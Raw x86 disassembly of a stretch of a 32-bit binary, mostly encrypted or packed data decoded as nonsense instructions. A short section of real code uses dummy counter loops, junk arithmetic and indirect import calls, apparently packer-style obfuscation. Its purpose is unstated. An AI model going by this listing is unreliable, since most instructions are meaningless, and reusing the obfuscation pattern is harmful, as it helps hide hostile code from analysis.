  41d3f3:	ins    BYTE PTR es:[edi],dx
  41d3f4:	jmp    0xdd05289a
  41d3f9:	jp     0x41d456
  41d3fb:	leave  
  41d3fc:	mov    esi,0x633fb758
  41d401:	int    0xe2
  41d403:	in     eax,dx
  41d404:	aam    0x3
  41d406:	push   edi
  41d407:	mov    edi,0xfd0e7986
  41d40c:	sbb    al,dh
  41d40e:	fwait
  41d40f:	mov    WORD PTR [edi-0x4a],?
  41d412:	arpl   WORD PTR [ebp+0x32],si
  41d415:	pop    edx
  41d416:	ss inc edx
  41d418:	inc    ebx
  41d419:	xor    ecx,DWORD PTR [ebp-0x10]
  41d41c:	fwait
  41d41d:	push   eax
  41d41e:	jne    0x41d488
  41d420:	ret    0x283f
  41d423:	mov    BYTE PTR [ebx+0x5562ccdc],bl
  41d429:	hlt    
  41d42a:	dec    ebp
  41d42b:	mov    al,ds:0x31d57120
  41d430:	xchg   BYTE PTR [ebx],al
  41d432:	push   0x4ad12c4a
  41d437:	cs das 
  41d439:	rol    BYTE PTR [ecx],0x28
  41d43c:	sub    BYTE PTR [ebx+0x5],al
  41d43f:	int3   
  41d440:	add    eax,0x8be80522
  41d445:	shl    DWORD PTR [esi],cl
  41d447:	xchg   DWORD PTR [ecx],edi
  41d449:	push   0x2e
  41d44b:	jp     0x41d402
  41d44d:	pusha  
  41d44e:	jge    0x41d432
  41d450:	jle    0x41d494
  41d452:	push   esp
  41d453:	dec    ecx
  41d454:	sub    dl,BYTE PTR [edx+0x2e46018c]
  41d45a:	ds mov ecx,0xa1d2c4d9
  41d460:	loope  0x41d41a
  41d462:	adc    esp,edx
  41d464:	jb     0x41d4d2
  41d466:	int    0x1e
  41d468:	push   esp
  41d469:	dec    esi
  41d46a:	ss call 0xb8fa47b0
  41d470:	fidiv  DWORD PTR [edi-0x3bc3915f]
  41d476:	xor    BYTE PTR [ecx+0x37],ah
  41d479:	cmp    esp,DWORD PTR [eax+edi*1]
  41d47c:	aad    0x8
  41d47e:	pop    edx
  41d47f:	test   al,0x39
  41d481:	das    
  41d482:	into   
  41d483:	dec    ebp
  41d484:	popa   
  41d485:	mov    BYTE PTR [ecx-0x1563b57f],dh
  41d48b:	dec    ebx
  41d48c:	jg     0x41d442
  41d48e:	push   cs
  41d48f:	adc    BYTE PTR [ebx],bl
  41d491:	popf   
  41d492:	and    ah,dl
  41d494:	cmp    esp,DWORD PTR [ecx-0x6564cd06]
  41d49a:	aam    0x76
  41d49c:	and    al,BYTE PTR [edi-0x3ee2334f]
  41d4a2:	iret   
  41d4a3:	inc    ebp
  41d4a4:	cs dec esp
  41d4a6:	cmp    DWORD PTR gs:[ebx+0x7d916d99],eax
  41d4ad:	push   esi
  41d4ae:	push   ecx
  41d4af:	mov    BYTE PTR [edx-0x250af816],ah
  41d4b5:	cmp    al,BYTE PTR [edi]
  41d4b7:	je     0x41d454
  41d4b9:	push   edx
  41d4ba:	ja     0x41d46c
  41d4bc:	mov    ds:0x36f74ae5,al
  41d4c1:	lods   al,BYTE PTR ds:[esi]
  41d4c2:	xlat   BYTE PTR ds:[ebx]
  41d4c3:	aam    0x36
  41d4c5:	jge    0x41d530
  41d4c7:	je     0x41d53a
  41d4c9:	std    
  41d4ca:	(bad)
  41d4ce:	inc    esi
  41d4cf:	cmp    al,0x72
  41d4d1:	jge    0x41d54d
  41d4d3:	mov    edi,0x2b9f8a83
  41d4d8:	push   esi
  41d4d9:	inc    edi
  41d4da:	xor    DWORD PTR [esi],ebx
  41d4dc:	xchg   ebx,eax
  41d4dd:	adc    al,0x6b
  41d4df:	repnz pop edx
  41d4e1:	imul   esp,DWORD PTR [esi-0x62],0xffffffef
  41d4e5:	out    0xb0,al
  41d4e7:	adc    dl,BYTE PTR [edi]
  41d4e9:	clc    
  41d4ea:	ret    0xc44e
  41d4ed:	dec    ebx
  41d4ee:	add    al,0x1
  41d4f0:	xchg   edi,eax
  41d4f1:	mov    edi,0xd381a69a
  41d4f6:	stos   BYTE PTR es:[edi],al
  41d4f7:	inc    ebx
  41d4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4f9:	sub    al,BYTE PTR [edx]
  41d4fb:	sti    
  41d4fc:	cmp    BYTE PTR [edi],bl
  41d4fe:	cmc    
  41d4ff:	fild   QWORD PTR [ecx+0x42]
  41d502:	loope  0x41d513
  41d504:	stos   DWORD PTR es:[edi],eax
  41d505:	add    al,0x50
  41d508:	pop    ds
  41d509:	and    eax,0xae66b9e2
  41d50e:	mov    ds:0x9c4bd3e0,al
  41d513:	jmp    0x41d4dd
  41d515:	sub    al,0x76
  41d517:	(bad)  
  41d518:	cmp    eax,0x3e342b59
  41d51d:	data16 in al,dx
  41d51f:	int    0xcc
  41d521:	jmp    0x41d510
  41d523:	sub    ch,BYTE PTR [eax+0x2f]
  41d526:	ins    DWORD PTR es:[edi],dx
  41d527:	fbstp  TBYTE PTR [ebp+0xc4e277b]
  41d52d:	mov    eax,ds:0xd782826e
  41d532:	adc    eax,0x88157661
  41d537:	ret    0x1f81
  41d53a:	dec    ecx
  41d53b:	adc    eax,0x4f352990
  41d540:	pop    esp
  41d541:	xor    eax,0xc635803e
  41d546:	xchg   edx,eax
  41d547:	xchg   edx,eax
  41d548:	xchg   ebx,eax
  41d549:	icebp  
  41d54a:	gs dec ecx
  41d54c:	dec    edx
  41d54d:	idiv   DWORD PTR [edi]
  41d54f:	fcmovbe st,st(4)
  41d551:	int3   
  41d552:	push   edi
  41d553:	pop    edi
  41d554:	lahf   
  41d555:	(bad)  
  41d556:	mov    fs,WORD PTR [ecx-0x2dfe27da]
  41d55c:	xchg   edx,eax
  41d55d:	xchg   ebx,eax
  41d55e:	pop    edi
  41d55f:	stos   DWORD PTR es:[edi],eax
  41d560:	int3   
  41d561:	stc    
  41d562:	lods   al,BYTE PTR ds:[esi]
  41d563:	pop    ds
  41d564:	sub    ebx,0x2d6750c4
  41d56a:	in     eax,dx
  41d56b:	icebp  
  41d56c:	jbe    0x41d5cb
  41d56e:	mov    dh,0x62
  41d570:	mov    dh,0xc8
  41d572:	imul   DWORD PTR [edi-0xf]
  41d575:	(bad)  [esi]
  41d577:	in     eax,0x5a
  41d579:	in     al,0x39
  41d57b:	loopne 0x41d59e
  41d57d:	(bad)  
  41d57f:	je     0x41d578
  41d581:	lds    ecx,FWORD PTR [ebp+0x3a]
  41d584:	gs addr16 xchg edx,eax
  41d587:	popa   
  41d588:	xor    BYTE PTR [edx],al
  41d58a:	sub    BYTE PTR [ecx-0x75e75039],bl
  41d590:	or     ah,dh
  41d592:	pop    ss
  41d593:	sub    ebp,ebp
  41d595:	lahf   
  41d596:	out    0x3f,al
  41d598:	call   0xec19:0x5532b3b2
  41d59f:	sahf   
  41d5a0:	into   
  41d5a1:	shl    edi,1
  41d5a3:	call   0x99695c8e
  41d5a8:	cmp    al,BYTE PTR [ecx-0x47129ac8]
  41d5ae:	inc    ecx
  41d5af:	pop    eax
  41d5b0:	sub    DWORD PTR [eax-0x58],eax
  41d5b3:	mov    bh,dh
  41d5b5:	mov    cs,WORD PTR gs:[eax-0x43b45ac6]
  41d5bc:	int3   
  41d5bd:	int3   
  41d5be:	in     al,dx
  41d5bf:	pop    esi
  41d5c0:	mov    bh,0x4f
  41d5c2:	pusha  
  41d5c3:	lds    esp,FWORD PTR ds:0x3b88dcf1
  41d5c9:	pushf  
  41d5ca:	and    al,0x90
  41d5cc:	fidivr DWORD PTR [esi+0x13]
  41d5cf:	mov    esi,0xfb8beb0a
  41d5d4:	dec    ebp
  41d5d5:	imul   BYTE PTR [ebx-0x1d65377d]
  41d5db:	mov    dl,BYTE PTR [eax+0x5cf22271]
  41d5e1:	enter  0xdc5d,0x79
  41d5e5:	cli    
  41d5e6:	push   edi
  41d5e7:	ficomp WORD PTR gs:[eax]
  41d5ea:	sahf   
  41d5eb:	loope  0x41d630
  41d5ed:	test   BYTE PTR [ecx+esi*8+0x24e58bfb],bh
  41d5f4:	add    cl,BYTE PTR [esi]
  41d5f6:	xor    BYTE PTR [ebp+0x54540399],bh
  41d5fc:	xchg   esp,eax
  41d5fd:	add    al,0x93
  41d5ff:	repz test al,0xec
  41d602:	inc    esi
  41d603:	push   ebx
  41d604:	ret    
  41d605:	nop
  41d606:	ret    0x490e
  41d609:	fs popf 
  41d60b:	int    0xcb
  41d60d:	(bad)  
  41d60f:	scas   eax,DWORD PTR es:[edi]
  41d610:	lea    ecx,[edx+ecx*1+0x241fcde]
  41d617:	mov    DWORD PTR [ebp-0x48],ecx
  41d61a:	mov    ecx,DWORD PTR [ebp+0x8]
  41d61d:	mov    edx,0xfa5e1521
  41d622:	sub    edx,ecx
  41d624:	add    edx,DWORD PTR [ebp-0x44]
  41d627:	mov    DWORD PTR [ebp-0x44],edx
  41d62a:	mov    ecx,DWORD PTR [ebp+0x8]
  41d62d:	xor    ecx,eax
  41d62f:	add    ecx,esi
  41d631:	jne    0x41b215
  41d637:	mov    ecx,DWORD PTR [ebp-0x8]
  41d63a:	xor    ecx,eax
  41d63c:	mov    eax,DWORD PTR [ebp+0x10]
  41d63f:	add    ecx,esi
  41d641:	mov    DWORD PTR [eax],ecx
  41d643:	pop    edi
  41d644:	pop    esi
  41d645:	pop    ebx
  41d646:	leave  
  41d647:	ret    0xc
  41d64a:	push   ebp
  41d64b:	mov    ebp,esp
  41d64d:	sub    esp,0x7c
  41d650:	or     ecx,0x868
  41d656:	push   esi
  41d657:	and    DWORD PTR ds:0x42862f,0x0
  41d661:	jmp    0x41d674
  41d666:	xor    eax,eax
  41d668:	or     eax,DWORD PTR ds:0x42862f
  41d66e:	inc    eax
  41d66f:	mov    ds:0x42862f,eax
  41d674:	cmp    DWORD PTR ds:0x42862f,0x1b
  41d67b:	jae    0x41d6a6
  41d681:	cmp    DWORD PTR ds:0x42862f,0x24
  41d688:	jbe    0x41d6a6
  41d68e:	jmp    0x41d6a1
  41d693:	push   DWORD PTR [ebp-0x28]
  41d696:	push   0x42865b
  41d69b:	call   DWORD PTR ds:0x4287b3
  41d6a1:	jmp    0x41d666
  41d6a6:	push   edi
  41d6a7:	mov    eax,ds:0x4282ef
  41d6ac:	mov    DWORD PTR ds:0x42866f,0x15
  41d6b6:	cmp    DWORD PTR ds:0x42866f,0x0
  41d6bd:	je     0x41d6ed
  41d6c3:	cmp    DWORD PTR ds:0x42866f,0x1f
  41d6ca:	jl     0x41d6ed
  41d6d0:	jmp    0x41d6db
  41d6d5:	call   DWORD PTR ds:0x4287b7
  41d6db:	mov    ecx,DWORD PTR ds:0x42866f
  41d6e1:	dec    ecx
  41d6e2:	mov    DWORD PTR ds:0x42866f,ecx
  41d6e8:	jmp    0x41d6b6
  41d6ed:	mov    DWORD PTR [ebp-0x24],eax
  41d6f0:	xor    eax,eax
  41d6f2:	add    eax,DWORD PTR ds:0x42868b
  41d6f8:	mov    edi,DWORD PTR ds:0x428707
  41d6fe:	sub    eax,edi
  41d700:	xor    eax,DWORD PTR [eax+edi*1]
  41d703:	mov    eax,ds:0x4283fb
  41d708:	not    DWORD PTR ds:0x428613
  41d70e:	mov    DWORD PTR [ebp-0x34],eax
  41d711:	and    DWORD PTR [ebp-0x30],0x0
  41d715:	sub    esi,0x14f1
  41d71b:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  41d722:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  41d729:	xor    edi,edi
  41d72b:	mov    eax,DWORD PTR [ebp-0x10]
  41d72e:	mov    esi,DWORD PTR ds:0x42860b
  41d734:	add    DWORD PTR ds:0x428653,esi
  41d73a:	mov    ecx,DWORD PTR [ebp-0x10]
  41d73d:	mov    DWORD PTR ds:0x42860f,0x19
  41d747:	cmp    DWORD PTR ds:0x42860f,0x0
  41d74e:	je     0x41d783
  41d754:	cmp    DWORD PTR ds:0x42860f,0x24
  41d75b:	jge    0x41d783
  41d761:	jmp    0x41d76f
  41d766:	push   DWORD PTR [ebp-0x14]
  41d769:	call   DWORD PTR ds:0x4287bb
  41d76f:	xor    edi,edi
  41d771:	xor    edi,DWORD PTR ds:0x42860f
  41d777:	dec    edi
  41d778:	mov    DWORD PTR ds:0x42860f,edi
  41d77e:	jmp    0x41d747
  41d783:	sub    eax,ecx
  41d785:	add    DWORD PTR ds:0x42865b,ecx
  41d78b:	mov    DWORD PTR [ebp-0x10],eax
  41d78e:	sub    edi,edi
  41d790:	xor    DWORD PTR [ebp-0x10],0xf89cb5b0
  41d797:	mov    edi,DWORD PTR ds:0x42862b
  41d79d:	adc    edi,DWORD PTR ds:0x42864b
  41d7a3:	mov    DWORD PTR ds:0x42862b,edi
  41d7a9:	mov    eax,DWORD PTR [ebp-0x18]
  41d7ac:	inc    edi
  41d7ad:	mov    ecx,DWORD PTR [ebp-0x18]
  41d7b0:	and    DWORD PTR ds:0x42862f,0x0
  41d7ba:	mov    esi,DWORD PTR ds:0x42862f
  41d7c0:	inc    esi
  41d7c1:	mov    DWORD PTR ds:0x42862f,esi
  41d7c7:	cmp    DWORD PTR ds:0x42862f,0x21
  41d7ce:	jb     0x41d804
  41d7d4:	jmp    0x41d7f7
  41d7d9:	push   0x2450
  41d7de:	push   0x4280ae
  41d7e3:	push   DWORD PTR [ebp-0x20]
  41d7e6:	push   0x428083
  41d7eb:	push   DWORD PTR [ebp-0x18]
  41d7ee:	push   DWORD PTR [ebp-0x28]
  41d7f1:	call   DWORD PTR ds:0x4287bf
  41d7f7:	cmp    DWORD PTR ds:0x42862f,0x1d
  41d7fe:	jb     0x41d7ba
  41d804:	sub    eax,ecx
  41d806:	mov    DWORD PTR ds:0x428667,0x2f20
  41d810:	mov    DWORD PTR [ebp-0x18],eax
  41d813:	or     DWORD PTR [ebp-0x18],0xf89f05b0
  41d81a:	sbb    edi,edi
  41d81c:	mov    eax,DWORD PTR [ebp-0xc]
  41d81f:	xor    ecx,ecx
  41d821:	or     ecx,DWORD PTR ds:0x428697
  41d827:	mov    esi,DWORD PTR ds:0x42869f
  41d82d:	sub    ecx,esi
  41d82f:	or     ecx,DWORD PTR [ecx+esi*1]
  41d832:	mov    ecx,DWORD PTR [ebp-0xc]
  41d835:	sub    eax,ecx
  41d837:	and    DWORD PTR ds:0x42863b,0x0
  41d841:	jmp    0x41d853
  41d846:	mov    esi,DWORD PTR ds:0x42863b
  41d84c:	inc    esi
  41d84d:	mov    DWORD PTR ds:0x42863b,esi
  41d853:	cmp    DWORD PTR ds:0x42863b,0x16
  41d85a:	jae    0x41d89c
  41d860:	cmp    DWORD PTR ds:0x42863b,0x9
  41d867:	jle    0x41d89c
  41d86d:	jmp    0x41d87d
  41d872:	push   0x428083
  41d877:	call   DWORD PTR ds:0x4287c3
  41d87d:	cmp    DWORD PTR ds:0x42863b,0x8
  41d884:	jne    0x41d897
  41d88a:	mov    esi,DWORD PTR ds:0x42863b
  41d890:	inc    esi
  41d891:	mov    DWORD PTR ds:0x42863b,esi
  41d897:	jmp    0x41d846
  41d89c:	mov    DWORD PTR [ebp-0xc],eax
  41d89f:	or     DWORD PTR [ebp-0xc],0xf89c85f0
  41d8a6:	mov    eax,DWORD PTR [ebp-0x1c]
  41d8a9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d8ac:	sub    eax,ecx
  41d8ae:	mov    DWORD PTR [ebp-0x1c],eax
  41d8b1:	or     DWORD PTR [ebp-0x1c],0xf89c8590
  41d8b8:	mov    eax,DWORD PTR [ebp-0x20]
  41d8bb:	mov    ecx,DWORD PTR [ebp-0x20]
  41d8be:	sub    eax,ecx
  41d8c0:	mov    DWORD PTR [ebp-0x20],eax
  41d8c3:	mov    eax,DWORD PTR [ebp-0x2c]
  41d8c6:	mov    ecx,DWORD PTR [ebp-0x20]
  41d8c9:	mov    esi,0x75108a4
  41d8ce:	xor    eax,esi
  41d8d0:	mov    edi,0x3272ec
  41d8d5:	add    eax,edi
  41d8d7:	or     eax,ecx
  41d8d9:	mov    DWORD PTR [ebp-0x20],eax
  41d8dc:	mov    eax,DWORD PTR [ebp-0x4]
  41d8df:	mov    ecx,DWORD PTR [ebp-0x4]
  41d8e2:	sub    eax,ecx
  41d8e4:	mov    DWORD PTR [ebp-0x4],eax
  41d8e7:	or     DWORD PTR [ebp-0x4],0xf89c85bd
  41d8ee:	mov    eax,DWORD PTR [ebp-0xc]
  41d8f1:	xor    eax,esi
  41d8f3:	add    eax,edi
  41d8f5:	push   eax
  41d8f6:	mov    eax,DWORD PTR [ebp-0x10]
  41d8f9:	xor    eax,esi
  41d8fb:	add    eax,edi
  41d8fd:	push   eax
  41d8fe:	mov    eax,DWORD PTR [ebp-0x4]
  41d901:	xor    eax,esi
  41d903:	add    eax,edi
  41d905:	push   eax
  41d906:	lea    eax,[ebp-0x7c]
  41d909:	push   eax
  41d90a:	push   DWORD PTR [ebp-0x2c]
  41d90d:	push   DWORD PTR [ebp-0x28]
  41d910:	call   0x40f37f
  41d915:	test   eax,eax
  41d917:	je     0x41fca5
  41d91d:	lea    eax,[ebp-0x7c]
  41d920:	push   eax
  41d921:	mov    eax,DWORD PTR [ebp-0x28]
  41d924:	jmp    0x41fc84
  41d929:	fs popa 
  41d92b:	dec    eax
  41d92c:	mov    cs,WORD PTR [ebx+0x7b]
  41d92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d930:	jnp    0x41d8c9
  41d932:	rol    edx,1
  41d934:	aaa    
  41d935:	retf   
  41d936:	cmp    DWORD PTR [ecx+0x7dd42a24],ecx
  41d93c:	jp     0x41d97d
  41d93e:	pop    edi
  41d93f:	jp     0x41d9bb
  41d941:	mov    ds:0x34e4e440,al
  41d946:	dec    edx
  41d947:	leave  
  41d948:	xor    BYTE PTR [edx-0x31],0x57
  41d94c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d94d:	inc    ecx
  41d94e:	push   es
  41d94f:	arpl   WORD PTR [ebp+0x3b],di
  41d952:	push   ss
  41d953:	cmp    ch,bl
  41d955:	cmc    
  41d956:	pop    esi
  41d957:	pop    ebx
  41d958:	leave  
  41d959:	or     al,0x84
  41d95b:	imul   eax,ecx,0xffffffe9
  41d95e:	(bad)  
  41d95f:	mov    dh,0x87
  41d961:	and    eax,DWORD PTR [ebp+0x1081e61d]
  41d967:	or     al,0xa6
  41d969:	sbb    dh,0xd9
  41d96c:	sbb    ah,BYTE PTR [ecx-0x27bc99db]
  41d972:	or     eax,0x567364c7
  41d977:	push   ss
  41d978:	call   DWORD PTR [ebp-0x78]
  41d97b:	stc    
  41d97c:	pop    esp
  41d97d:	shl    BYTE PTR [esi+0x6d],0x39
  41d981:	inc    esp
  41d982:	imul   eax,ebx,0xffffffb6
  41d985:	cld    
  41d986:	mov    es,WORD PTR [edx+edx*4+0x5ae3e5e5]
  41d98d:	mov    esp,0x20653b0d
  41d992:	jne    0x41d9ee
  41d994:	inc    eax
  41d995:	(bad)  
  41d996:	call   0x7dd1:0xdf1919a
  41d99d:	(bad)  
  41d99e:	mov    eax,0xf34c76c9
  41d9a3:	mov    ebx,0xa64769ac
  41d9a8:	lahf   
  41d9a9:	frstor [esi]
  41d9ab:	mov    ch,0x82
  41d9ad:	mov    ebx,0x7b01d04d
  41d9b2:	dec    eax
  41d9b3:	mov    dl,0x8a
  41d9b5:	jle    0x41d9df
  41d9b7:	jecxz  0x41d9b3
  41d9b9:	pop    eax
  41d9ba:	test   eax,0xbb3fada8
  41d9bf:	mov    BYTE PTR [edi-0x6c],al
  41d9c2:	and    eax,0xbb595c94
  41d9c7:	out    0xd4,eax
  41d9c9:	gs xchg ecx,eax
  41d9cb:	pop    eax
  41d9cc:	sbb    bh,BYTE PTR [edi-0x71]
  41d9cf:	inc    edx
  41d9d0:	aas    
  41d9d1:	sar    BYTE PTR [ebp+0x128ed9fe],cl
  41d9d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9d8:	jmp    0x2507:0xe6511ecb
  41d9df:	push   0x7d739be8
  41d9e4:	mov    ecx,0xc60ce5b9
  41d9e9:	pop    ecx
  41d9ea:	stos   DWORD PTR es:[edi],eax
  41d9eb:	push   0x33
  41d9ed:	mov    ebp,0x9decb4f0
  41d9f2:	fisttp WORD PTR [ebx+0xe]
  41d9f5:	enter  0x9ad1,0x6e
  41d9f9:	fld    TBYTE PTR [edx]
  41d9fb:	mov    esi,ecx
  41d9fd:	sar    BYTE PTR [ebx+eax*8+0x7c],cl
  41da01:	mov    bh,0x79
  41da03:	lods   al,BYTE PTR ds:[esi]
  41da04:	mov    dl,0x29
  41da06:	retf   0x53f5
  41da09:	push   edi
  41da0b:	fst    st(5)
  41da0d:	inc    ecx
  41da0e:	cmp    DWORD PTR [ebp+0xa65ecaf],esp
  41da14:	pop    es
  41da15:	fwait
  41da16:	shr    BYTE PTR [esi+ebx*8+0x2580da9f],cl
  41da1d:	jg     0x41d9d3
  41da1f:	jae    0x41d9e5
  41da21:	aas    
  41da22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da23:	mov    DWORD PTR [eax+edx*4],esp
  41da26:	xchg   ebx,eax
  41da27:	sbb    ch,BYTE PTR [edx]
  41da29:	sbb    eax,0xa7f42c27
  41da2e:	adc    al,0xd7
  41da30:	jbe    0x41d9d4
  41da32:	aad    0xa0
  41da34:	dec    esi
  41da35:	mov    dh,0xbd
  41da37:	lods   al,BYTE PTR ds:[esi]
  41da38:	mov    eax,ds:0x3743341c
  41da3d:	mov    dl,0xa4
  41da3f:	in     eax,dx
  41da40:	repnz out 0xc0,al
  41da43:	push   cs
  41da44:	pushf  
  41da45:	mov    ?,WORD PTR [edx]
  41da47:	and    DWORD PTR ss:[esi-0x2c],ebp
  41da4b:	or     bh,BYTE PTR [ebx]
  41da4d:	push   ss
  41da4e:	fisttp WORD PTR [eax]
  41da50:	xor    dl,al
  41da52:	(bad)  
  41da54:	pop    ds
  41da55:	sahf   
  41da56:	cli    
  41da57:	ins    DWORD PTR es:[edi],dx
  41da58:	pop    ebx
  41da59:	cwde   
  41da5a:	imul   ecx,esp,0x42
  41da5d:	mov    esi,0x8aa933b8
  41da62:	jne    0x41dadf
  41da64:	xchg   ebx,eax
  41da65:	rcl    BYTE PTR [ebx],0x12
  41da68:	jmp    0x1682:0x11f5eca1
  41da6f:	mov    bl,0x28
  41da71:	or     BYTE PTR [ecx+0x11],ch
  41da74:	addr16 dec esi
  41da76:	adc    ch,al
  41da78:	and    esi,edi
  41da7a:	push   edx
  41da7b:	icebp  
  41da7c:	mov    dh,BYTE PTR [ebp-0x521b33cd]
  41da82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da83:	adc    DWORD PTR [ebp-0xedab2e3],0x6
  41da8a:	popa   
  41da8b:	fs or  eax,0xd086cfe2
  41da91:	call   0xefe4ea63
  41da96:	enter  0xfdf,0x4
  41da9a:	imul   eax,DWORD PTR [edi-0x52],0xddb10601
  41daa1:	ja     0x41db1d
  41daa3:	scas   al,BYTE PTR es:[edi]
  41daa4:	mov    ds:0x413e5c26,al
  41daa9:	pushf  
  41daaa:	in     eax,0x9
  41daac:	push   es
  41daad:	nop
  41daae:	ds int 0x48
  41dab1:	inc    edi
  41dab2:	sub    eax,0x7dd5f2c6
  41dab7:	fimul  DWORD PTR [ebp-0xa]
  41daba:	les    edx,FWORD PTR [edi-0x7d]
  41dabd:	jl     0x41da4c
  41dabf:	je     0x41da5d
  41dac1:	(bad)  
  41dac2:	gs maskmovq mm0,(bad)
  41dac4:	test   DWORD PTR [edx+0x4d],0xe91119b6
  41dacb:	fldenv [esi]
  41dacd:	jmp    ebp
  41dacf:	jns    0x41db43
  41dad1:	in     al,0xf
  41dad3:	push   esi
  41dad4:	push   cs
  41dad5:	retf   
  41dad6:	cwde   
  41dad7:	and    DWORD PTR [edi+0x4d],eax
  41dada:	jno    0x41db02
  41dadc:	inc    ecx
  41dadd:	inc    edx
  41dade:	jmp    0x41db4c
  41dae0:	dec    ebp
  41dae1:	mov    eax,0x23b54a8e
  41dae6:	arpl   WORD PTR [esp+ebx*2+0x15],bp
  41daea:	mov    ds:0x9e09e37d,al
  41daef:	cmp    esi,DWORD PTR [ebp+0x60b54e02]
  41daf5:	dec    esi
  41daf6:	int    0x44
  41daf8:	pop    eax
  41daf9:	scas   al,BYTE PTR es:[edi]
  41dafa:	dec    eax
  41dafb:	ss pusha 
  41dafd:	fyl2x  
  41daff:	leave  
  41db00:	and    al,0xa5
  41db02:	pop    ds
  41db03:	adc    eax,0xbe7d3650
  41db08:	dec    edx
  41db09:	pop    ebx
  41db0a:	mov    edi,0xe0c6a310
  41db0f:	push   eax
  41db10:	push   esi
  41db11:	dec    esi
  41db12:	cwde   
  41db13:	dec    esp
  41db14:	daa    
  41db15:	jmp    0x390f:0x92bb630d
  41db1c:	push   0xc
  41db1e:	dec    ecx
  41db1f:	ror    BYTE PTR [eax+edi*2],1
  41db22:	inc    edx
  41db23:	push   esi
  41db24:	scas   al,BYTE PTR es:[edi]
  41db25:	mov    ebp,0xd7f1a2b4
  41db2a:	or     BYTE PTR [eax-0x5c9d04c5],dl
  41db30:	xchg   ebx,eax
  41db31:	(bad)  
  41db33:	rcr    ecx,cl
  41db35:	loopne 0x41db73
  41db37:	arpl   WORD PTR [edi-0x72115070],sp
  41db3d:	call   0x6e64:0xe96d8045
  41db44:	pop    esi
  41db45:	and    cl,ch
  41db47:	es mov edi,0x9bfdf5f7
  41db4d:	jnp    0x41db3d
  41db4f:	push   eax
  41db50:	push   es
  41db51:	call   0xe7c3:0xfa421f8d
  41db58:	push   esp
  41db59:	sub    al,BYTE PTR [ecx-0x10]
  41db5c:	mov    ebp,DWORD PTR ds:[ecx]
  41db5f:	div    DWORD PTR [edi]
  41db61:	pop    es
  41db62:	sub    al,0xab
  41db64:	clc    
  41db65:	(bad)  
  41db66:	mov    dh,0x13
  41db68:	sub    ebx,DWORD PTR [ebp-0x4b46915c]
  41db6e:	imul   eax,DWORD PTR [eax+ecx*4],0x33d458f3
  41db75:	ja     0x41dbe7
  41db77:	popf   
  41db78:	push   ebp
  41db79:	jecxz  0x41dbdb
  41db7b:	or     bl,0x6c
  41db7e:	xor    dh,BYTE PTR [edx-0x36]
  41db81:	jno    0x41db47
  41db83:	inc    esi
  41db84:	pop    edx
  41db85:	xchg   edx,eax
  41db86:	sbb    ecx,DWORD PTR [ebx-0x6f2e8bd8]
  41db8c:	mov    DWORD PTR [ecx-0x22],eax
  41db8f:	push   edi
  41db90:	mov    al,ds:0xaf72df3d
  41db95:	nop
  41db96:	add    al,0xb1
  41db98:	jo     0x41dba5
  41db9a:	push   cs
  41db9b:	into   
  41db9c:	fnstsw WORD PTR [ecx-0xa73b02d]
  41dba2:	or     al,0x83
  41dba4:	(bad)  
  41dba5:	mov    dl,0xc7
  41dba7:	fsubr  DWORD PTR [edx-0x1cf06dd1]
  41dbad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbae:	xchg   BYTE PTR [ecx-0x4b0f6fd9],ch
  41dbb4:	xor    BYTE PTR [eax-0x3712db],ah
  41dbba:	(bad)  
  41dbbb:	push   ecx
  41dbbc:	stos   DWORD PTR es:[edi],eax
  41dbbd:	xor    eax,0xe5185462
  41dbc2:	imul   edx,DWORD PTR [ebp+0x696d863d],0x510cd76
  41dbcc:	fisubr DWORD PTR [edi+eax*2+0x1d]
  41dbd0:	test   al,0x4e
  41dbd2:	sub    al,0xff
  41dbd4:	lods   eax,DWORD PTR ds:[esi]
  41dbd5:	add    eax,0xad9a71fc
  41dbda:	mov    DWORD PTR [edi-0x5f46469],esp
  41dbe0:	fwait
  41dbe1:	adc    ch,ch
  41dbe3:	js     0x41db9c
  41dbe5:	dec    edx
  41dbe6:	fimul  WORD PTR [ebx]
  41dbe8:	jmpw   0xabe
  41dbec:	packssdw mm6,QWORD PTR [ebx]
  41dbef:	sub    ebp,DWORD PTR [ebp+0x5d]
  41dbf2:	push   ss
  41dbf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf4:	data16 int 0x6f
  41dbf7:	jp     0x41db8c
  41dbf9:	fadd   DWORD PTR [edi-0x3c913ded]
  41dbff:	xabort 0x4c
  41dc02:	xor    dl,BYTE PTR [ebx-0x7d]
  41dc05:	pop    edx
  41dc06:	xchg   edx,eax
  41dc07:	daa    
  41dc08:	adc    eax,0x42958332
  41dc0d:	push   0xbe9daf95
  41dc12:	sahf   
  41dc13:	pushf  
  41dc14:	pop    edx
  41dc15:	xchg   esi,eax
  41dc16:	test   DWORD PTR [edi-0xf],esi
  41dc19:	pushf  
  41dc1a:	xor    esi,eax
  41dc1c:	in     eax,dx
  41dc1d:	in     eax,dx
  41dc1e:	mov    ds:0xc662a065,eax
  41dc23:	or     ebx,DWORD PTR [esi]
  41dc25:	daa    
  41dc26:	mov    ds:0x3d53d59c,al
  41dc2b:	stos   DWORD PTR es:[edi],eax
  41dc2c:	push   ebx
  41dc2d:	stc    
  41dc2e:	dec    edi
  41dc2f:	add    BYTE PTR [edx],bl
  41dc31:	cwde   
  41dc32:	xchg   esp,ebx
  41dc34:	pop    edi
  41dc35:	pop    eax
  41dc36:	repnz test eax,0xed0c981b
  41dc3c:	mov    ah,0x7d
  41dc3e:	jecxz  0x41dc7c
  41dc40:	xor    eax,0xc13032f8
  41dc45:	push   edx
  41dc46:	and    BYTE PTR [ebp-0x28],cl
  41dc49:	push   0xb2239b7d
  41dc4e:	or     DWORD PTR [ebx],0xff86a266
  41dc54:	stos   BYTE PTR es:[edi],al
  41dc55:	mov    bl,0x97
  41dc57:	xchg   esi,eax
  41dc58:	hlt    
  41dc59:	adc    eax,0x88303558
  41dc5e:	(bad)  [edx+0x2a]
  41dc61:	and    edx,DWORD PTR [ebp-0x6b]
